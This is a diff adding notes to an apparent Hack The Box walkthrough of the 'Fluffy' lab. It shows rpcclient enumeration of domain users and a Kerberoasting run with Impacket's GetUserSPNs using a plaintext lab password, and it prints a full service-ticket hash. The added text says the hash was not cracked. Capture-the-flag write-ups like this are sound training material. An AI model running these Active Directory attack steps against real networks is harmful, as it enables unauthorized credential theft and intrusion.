@@ -145,5 +145,77 @@ Tip: Ensure the KRB5CCNAME export works in your virtual environment. Use an abso
 ### Access Service Account
 `evil-winrm -i <TARGET_IP> -u <SERVICE_ACCOUNT> -H <NT_HASH>`
 
+## Additiontal findings during enumeration  
+ 
 
+ rpcclient -U 'username%password' target_ip
+
+```
+  rpcclient $> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[ca_svc] rid:[0x44f]
+user:[ldap_svc] rid:[0x450]
+user:[p.agila] rid:[0x641]
+user:[winrm_svc] rid:[0x643]
+user:[j.coffey] rid:[0x645]
+user:[j.fleischman] rid:[0x646]
+
+rpcclient $> srvinfo
+        10.129.127.23  Wk Sv PDC Tim NT     
+        platform_id     :       500
+        os version      :       10.0
+        server type     :       0x80102b
+rpcclient $> queryuser j.fleischman 
+        User Name   :   j.fleischman
+        Full Name   :   Joel Fleischman
+        Home Drive  :
+        Dir Drive   :
+        Profile Path:
+        Logon Script:
+        Description :
+        Workstations:
+        Comment     :
+        Remote Dial :
+        Logon Time               :      Mon, 19 May 2025 16:14:00 BST
+        Logoff Time              :      Thu, 01 Jan 1970 01:00:00 BST
+        Kickoff Time             :      Thu, 14 Sep 30828 03:48:05 BST
+        Password last set Time   :      Fri, 16 May 2025 15:46:55 BST
+        Password can change Time :      Sat, 17 May 2025 15:46:55 BST
+        Password must change Time:      Thu, 14 Sep 30828 03:48:05 BST
+        unknown_2[0..31]...
+        user_rid :      0x646
+        group_rid:      0x201
+        acb_info :      0x00000210
+        fields_present: 0x00ffffff
+        logon_divs:     168
+        bad_password_count:     0x00000000
+        logon_count:    0x00000001
+        padding1[0..7]...
+        logon_hrs[0..21]...
+```
+
+
+```
+   GetUserSPNs.py fluffy.htb/j.fleischman:J0elTHEM4n1990! -dc-ip 10.129.232.88 -request 
+
+
+
+ GetUserSPNs.py fluffy.htb/j.fleischman:J0elTHEM4n1990! -dc-ip 10.129.232.88 -request 
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
+----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
+ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 11:07:50.136701  2025-05-21 17:21:15.969274             
+LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 11:17:00.599545  <never>                                
+WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-17 19:51:16.786913  2025-05-19 10:13:22.188468             
+
+
+
+[-] CCache file is not found. Skipping...
+
+$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$07ec094d61c0b3c37cf1215ac10332da$771f5c1189e990a8e4c09f1ec831c6b2ae03a37202a57edf412076e68bcf73f85ecb31988aa93e370a43f8f6d36ddc6cb83ee6fb64267e8c0f7bdcbc7675c120fa8f7c17b2ee134e6e54577d8137727191871fe9d84afe1cccaed8e28aa0dfd151385feba2e034ac6d3a8f2372c6bfc2a34d353d06a575d32531b8ff18a9151e971494924493a0d63526952ef9239884ea112ad270f1b76547f9e85031881b2958c818db46f2500f0f59375ef8281454fba50df365b4f910b4a0502472143c94eda236e712346182cf486ce04c6ef1aca04828afdf212be83e135137e9dcaabd4c14c85d53446ec35e4ccbabeb2cc42b9b4d6b719cddd63d7ad2251755627e5257993f5d05fa93f40f1c248531b7b7f971ab17ffa814a9b336e02b343c0fd2f42ba311b37af01f3e25c26ef7f22a8f21fb993ab9f4e6d8dbc18cc9d37662a87d30601a820a7fbc76198701b03123fe4ca2b1f7bedb40f5fb13039834374a6db91182c5fa126e81f4ed3fe5596ad4de6b3bbade9799f22cd871e60b5384b999da087115746271a88e8b2474ada87e49374a45140b8991c02a8a1d3f36870747dfae161e9e280b0361bf914a4468898e5f787594007977252fc5d9d757c50f75b6b6af5e1558fbbcc5581bdc5bb708325430cf526345bcf11746586af9b12265e7630effdfcf9327a237eff37b3825f96068c0e29a840115145b5edf3e57fd6387b64179d101130719a936fc3d0ea9f7c5117157c2631b87d08f481e942a83c5f96450c68b641adc2fcbde83180df0ea48e3cc175defa4eee3f672b73cfee73bd1efb5fbae61fac40b973b25df27a129741945a75f429741ff7f50594d2e0d670dde7a5a9236b7d8c5d8c903ceb5e660614428f4da0d91b5756634a0f798ef3b18a60a88b2470f89ebdaa2b469049394e35fc3a18a1bd905690521d12ba48a7be5daefe4d9e040564c7c5f04a794910bd516dc6c1e4d7ff55058f4178a229fddf0fb7087f869611e430534ecd4166d9de54bbee6efbdb3de83add758ff91aa98d6a99c56ee90e71db32db4648d9f3e0d034ced0a4daf34e7169602bf41676610ac231311ec9fb0ae31166af9f90b7a3a435d2f71d732bc5e51f67a67d033f0d8def561dc4ff9a263f4d961b203bf030a8d4540ae21e4bb983e1a30d95b2c101e3e6927f38ebd959bd650c3ed98e6af7259caf383e7d350fe9a7389501e5c1e232777d42b5f15b2c3b4f369b57c440dd6b47b7783dd29edb9a4ef6bdcefce2ee2065dd7bcdf96d2ca761ca391ba5c1c4a2d85b07955efc52ae9c9b38f49216b64ffa574ebf5b691521b90657ff51dc4b3633f9324c1b4843033041e21e35bd1d6b2cf65a893efc3b8cb0910d82667db533f42b7734e7ce9087dcf888225eddf03527923257fa1483d75185a0e5a805a62ffca165a1df99f096655844c857d9b9094587cdbb703ae136981df38d27211bbdc4f1f7729980a84af9ef0a94da25a58a68202820ba81ca2afe5da53037a1a0b2f2e70f5f8ccad5721db4bfa9badf6b55d0ddbc271f355e2```
+
+Not able to crack the hash
 
